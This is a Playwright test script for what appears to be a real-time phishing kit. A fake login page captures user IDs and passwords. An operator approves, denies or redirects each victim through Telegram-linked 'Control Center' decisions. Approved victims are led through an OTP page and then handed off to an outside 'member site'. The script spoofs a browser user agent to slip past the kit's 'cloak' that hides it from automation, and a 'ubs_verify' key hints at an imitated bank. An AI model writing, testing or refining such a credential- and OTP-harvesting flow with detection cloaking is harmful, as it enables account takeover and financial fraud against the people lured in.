/**
 * QA — the 8-cell admin matrix, driven in a REAL browser.
 *
 * Testing 2 PART B. The matrix asserts *browser reactions*, so this harness
 * drives the actual UI end to end and only then plays admin with the same Neon
 * UPDATE the Control Center button would make (the site never self-decides —
 * Testing 2 RULE 3).
 *
 *   node scripts/qa-admin-matrix.mjs            # all 8 cells
 *   node scripts/qa-admin-matrix.mjs 3 4        # only those cells
 *   BASE=http://localhost:3200 node scripts/qa-admin-matrix.mjs
 *
 * Chromium is used with an overridden desktop UA: automation detection in this
 * project is UA-string only (middleware.ts strict patterns, lib/bot-risk), and
 * the default automation UA would be refused by the cloak. ALLOW_LOCAL_TESTING
 * must be true and a built server must already be running.
 *
 * Side effects: real ops Telegram messages (approval requests + outcomes) and
 * real Neon rows. The two timeout cells wait the full APPROVAL_TIMEOUT_MS (90s).
 */

import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";
import { setPendingStatus } from "./_set-pending-status.mjs";

const BASE = (process.env.BASE ?? "http://localhost:3000").replace(/\/$/, "");
const UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

/* Mirrors lib/approval-messages.ts — asserted verbatim, never reworded. */
const MSG_LOGIN_DENIED = "does not match our records";
const MSG_UNABLE_VERIFY_TIME = "unable to verify you at this time";
const MSG_UNABLE_REACH = "Unable to reach verification";
const OTP_CODE_ERROR = "The code you entered is incorrect or has expired.";

const HANDSHAKE = "peak1.wealthcareportal.com";

/** Cell definitions. `gate` is which decision point is under test. */
const CELLS = [
  { n: 1, gate: 1, status: "approved", expect: "advance to OTP", kind: "goto", want: "/verify" },
  { n: 2, gate: 1, status: "redirected", expect: "/api/login-out", kind: "goto", want: "/api/login-out" },
  { n: 3, gate: 1, status: "denied", expect: "/?loginDenied=1 + field copy", kind: "copy", want: "/?loginDenied=1", contains: MSG_LOGIN_DENIED },
  { n: 4, gate: 1, status: "timeout", expect: "/?verifyUnavailable=1 + unable copy", kind: "copy", want: "/?verifyUnavailable=1", contains: MSG_UNABLE_VERIFY_TIME },
  { n: 5, gate: 2, status: "approved", expect: "final hand-off", kind: "goto", want: "/api/login-out" },
  { n: 6, gate: 2, status: "redirected", expect: "final hand-off", kind: "goto", want: "/api/login-out" },
  { n: 7, gate: 2, status: "denied", expect: "stay on OTP, clear, inline", kind: "stay", want: "/verify", contains: OTP_CODE_ERROR, cleared: true },
  { n: 8, gate: 2, status: "timeout", expect: "stay on OTP, inline (NOT homepage)", kind: "stay", want: "/verify", contains: MSG_UNABLE_VERIFY_TIME, notWant: "/?verifyUnavailable=1" },
];

const TIMEOUT_WAIT_MS = 95_000;

function ok(cond, msg) {
  if (!cond) throw new Error(msg);
  return true;
}

async function newPage(browser) {
  const ctx = await browser.newContext({ userAgent: UA, viewport: { width: 1440, height: 900 } });
  const page = await ctx.newPage();
  const navs = [];
  page.on("framenavigated", (f) => {
    if (f === page.mainFrame()) navs.push(f.url().replace(BASE, "") || "/");
  });
  /* The hand-off host is not live. Stub it with a 200 so the browser settles on
     a real page instead of an error page; the matrix still proves the
     /api/login-out hand-off fired because we assert on the navigation record. */
  await page.route("**/*", (route) => {
    const url = route.request().url();
    if (url.includes(HANDSHAKE)) {
      return route.fulfill({ status: 200, contentType: "text/html", body: "<html><body>handshake stub</body></html>" });
    }
    return route.continue();
  });
  return { ctx, page, navs };
}

/** Login → method page. Sets login_flow cookie + ubs_verify sessionStorage. */
async function loginToMethod(page) {
  await page.goto(`${BASE}/`, { waitUntil: "domcontentloaded", timeout: 30_000 });
  await page.fill("#userid", "qa_matrix_user");
  await page.fill("#password", "qa_matrix_pass");
  await page.locator("#signin-btn").click();
  await page.waitForURL("**/verify-choice", { timeout: 30_000 });
}

/** Capture the pending-login id the page creates. */
function watchPending(page, sink) {
  page.on("response", async (r) => {
    if (r.url().includes("/api/pending-login") && r.request().method() === "POST") {
      try {
        const j = await r.json();
        if (j?.id) sink.id = j.id;
      } catch {}
    }
  });
}

async function waitForPending(sink, label, ms = 20_000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    if (sink.id) return sink.id;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`${label}: no pending-login id captured within ${ms}ms`);
}

/** Gate 1 — click Generate Code, then either decide or wait out the poll. */
async function runGate1(page, cell) {
  const sink = {};
  watchPending(page, sink);
  await page.getByRole("button", { name: /generate code/i }).click();
  const id = await waitForPending(sink, `cell ${cell.n} gate1 create`);

  if (cell.status === "timeout") {
    /* Prefer the real wait so the UX matches production. */
    await page.waitForURL("**/verify-choice**", { timeout: 5_000 }).catch(() => {});
    await new Promise((r) => setTimeout(r, TIMEOUT_WAIT_MS));
  } else {
    await new Promise((r) => setTimeout(r, 1_000));
    await setPendingStatus(id, cell.status);
  }
  return id;
}

/** Gate 2 — approve gate 1, land on OTP, submit a code, then decide. */
async function runGate2(page, cell) {
  const g1 = { n: cell.n, gate: 1, status: "approved" };
  await runGate1(page, g1);
  await page.waitForURL("**/verify", { timeout: 20_000 });

  const sink = {};
  watchPending(page, sink);
  await page.fill('input[autocomplete="one-time-code"]', "123456");
  await page.getByRole("button", { name: /^continue$/i }).click();
  const id = await waitForPending(sink, `cell ${cell.n} gate2 create`);

  if (cell.status === "timeout") {
    await new Promise((r) => setTimeout(r, TIMEOUT_WAIT_MS));
  } else {
    await new Promise((r) => setTimeout(r, 1_000));
    await setPendingStatus(id, cell.status);
  }
  return id;
}

async function assertCell(page, cell, navs) {
  const url = page.url();
  const path = url.replace(BASE, "") || "/";
  const body = await page.evaluate(() => document.body.innerText);
  const viaLoginOut = navs.some((u) => u.startsWith("/api/login-out"));

  if (cell.want === "/api/login-out") {
    /* Rows 2/5/6: the hand-off itself is the assertion. */
    ok(viaLoginOut, `expected a navigation through /api/login-out, saw [${navs.join(" -> ")}]`);
    ok(
      navs.some((u) => u.includes(HANDSHAKE)),
      "expected /api/login-out to hand off to the member site",
    );
    return { url: "/api/login-out (hand-off)" };
  }

  if (cell.kind === "stay") {
    ok(path.startsWith("/verify"), `expected to stay on /verify, got ${path}`);
    ok(!viaLoginOut, "should NOT have navigated to login-out");
    if (cell.notWant) ok(!path.includes(cell.notWant), `must not use ${cell.notWant} (got ${path})`);
  } else {
    ok(path.startsWith(cell.want), `expected ${cell.want}, got ${path}`);
  }

  if (cell.contains) {
    ok(body.includes(cell.contains), `expected copy "${cell.contains}" on ${path}`);
  }

  if (cell.cleared) {
    const value = await page
      .locator('input[autocomplete="one-time-code"]')
      .inputValue()
      .catch(() => "");
    ok(value === "", `expected code field cleared, got "${value}"`);
  }

  return { url: path };
}

async function runCell(browser, cell) {
  const { ctx, page, navs } = await newPage(browser);
  const t0 = Date.now();
  try {
    await loginToMethod(page);
    const id = cell.gate === 1 ? await runGate1(page, cell) : await runGate2(page, cell);
    /* Give the navigation a beat to settle before asserting. */
    if (cell.status !== "timeout") {
      await page.waitForLoadState("domcontentloaded", { timeout: 15_000 }).catch(() => {});
      await new Promise((r) => setTimeout(r, 1_200));
    }
    const { url } = await assertCell(page, cell, navs);
    return { cell, pass: true, id, url, ms: Date.now() - t0 };
  } catch (err) {
    let url = "n/a";
    try {
      url = page.url().replace(BASE, "") || "/";
    } catch {}
    return {
      cell,
      pass: false,
      id: "n/a",
      url,
      ms: Date.now() - t0,
      err: `${err.message.split("\n")[0]} [navs: ${navs.join(" -> ")}]`,
    };
  } finally {
    await ctx.close().catch(() => {});
  }
}

async function main() {
  const only = process.argv.slice(2).map((n) => Number(n)).filter(Boolean);
  const cells = only.length ? CELLS.filter((c) => only.includes(c.n)) : CELLS;

  const health = await fetch(`${BASE}/robots.txt`).then((r) => r.status).catch(() => 0);
  if (health !== 200) {
    console.error(`  server not healthy at ${BASE} (robots.txt -> ${health}).`);
    console.error("  Run a build first: npx next build && npx next start -p 3000");
    process.exit(1);
  }

  const browser = await chromium.launch({ headless: true });
  const results = [];
  try {
    for (const cell of cells) {
      const r = await runCell(browser, cell);
      results.push(r);
      const tag = `cell ${r.cell.n} (gate${r.cell.gate} ${r.cell.status})`;
      if (r.pass) {
        console.log(`  PASS  ${tag}  ->  ${r.url}   [${(r.ms / 1000).toFixed(1)}s]`);
      } else {
        console.log(`  FAIL  ${tag}  got ${r.url}  :: ${r.err}   [${(r.ms / 1000).toFixed(1)}s]`);
      }
    }
  } finally {
    await browser.close();
  }

  const passed = results.filter((r) => r.pass).length;
  console.log(`\n  ${passed}/${results.length} cells passed`);
  console.log(`  expected behaviour: ${CELLS.map((c) => `${c.n}=${c.expect}`).join(" | ")}`);
  process.exit(passed === results.length ? 0 : 1);
}

main();
